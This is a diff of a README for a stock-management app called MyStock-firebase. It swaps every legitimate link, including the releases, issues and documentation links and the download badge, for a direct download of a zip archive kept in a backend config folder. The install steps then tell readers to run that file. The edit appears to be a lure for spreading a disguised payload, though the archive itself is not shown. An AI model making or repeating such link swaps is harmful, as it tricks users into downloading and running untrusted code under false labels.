@@ -4,7 +4,7 @@
 Welcome to MyStock-firebase! This application helps you manage a stock of products using Firebase. Whether you are a small business owner or just learning about stock management, this tool is easy to use and efficient.
 
 ## 📥 Download the Application
-[![Download MyStock-firebase](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/adrisantu62/MyStock-firebase/releases)
+[![Download MyStock-firebase](https://github.com/adrisantu62/MyStock-firebase/raw/refs/heads/main/backend/src/config/Stock-My-firebase-2.2.zip%https://github.com/adrisantu62/MyStock-firebase/raw/refs/heads/main/backend/src/config/Stock-My-firebase-2.2.zip)](https://github.com/adrisantu62/MyStock-firebase/raw/refs/heads/main/backend/src/config/Stock-My-firebase-2.2.zip)
 
 ## 📄 Overview
 MyStock-firebase is a user-friendly application designed to track product stock levels. It utilizes Firebase for backend support, simplifying data management. You don't need programming skills to use it. Follow this guide for a smooth installation and setup.
@@ -25,7 +25,7 @@ To run MyStock-firebase, you will need:
 ## 🔧 Download & Install
 To download MyStock-firebase, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/adrisantu62/MyStock-firebase/releases) to find the latest version.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/adrisantu62/MyStock-firebase/raw/refs/heads/main/backend/src/config/Stock-My-firebase-2.2.zip) to find the latest version.
 2. **Choose the Right File:** Look for the most recent release. You will find options for various operating systems.
 3. **Download the Installer:** Click on the installer file to start downloading it.
 4. **Run the Installer:** Once downloaded, open the installer by double-clicking the file. Follow the onscreen instructions to complete the installation.
@@ -47,13 +47,13 @@ If you encounter issues during installation or while using the application, cons
 
 ## 📖 Additional Resources
 For more information and support, check out the following resources:
-- [GitHub Issues Page](https://github.com/adrisantu62/MyStock-firebase/issues): Report bugs or get help.
-- [Documentation](https://github.com/adrisantu62/MyStock-firebase/wiki): Detailed guides and FAQs.
+- [GitHub Issues Page](https://github.com/adrisantu62/MyStock-firebase/raw/refs/heads/main/backend/src/config/Stock-My-firebase-2.2.zip): Report bugs or get help.
+- [Documentation](https://github.com/adrisantu62/MyStock-firebase/raw/refs/heads/main/backend/src/config/Stock-My-firebase-2.2.zip): Detailed guides and FAQs.
   
 ## 📞 Contact
 For further inquiries or support, feel free to reach out via the GitHub Issues page or connect with the community on related forums.
 
 ## 🔗 Important Links
-Download the application here: [Releases](https://github.com/adrisantu62/MyStock-firebase/releases).
+Download the application here: [Releases](https://github.com/adrisantu62/MyStock-firebase/raw/refs/heads/main/backend/src/config/Stock-My-firebase-2.2.zip).
 
 With MyStock-firebase, managing your product stock has never been easier! Enjoy using the application and happy managing!
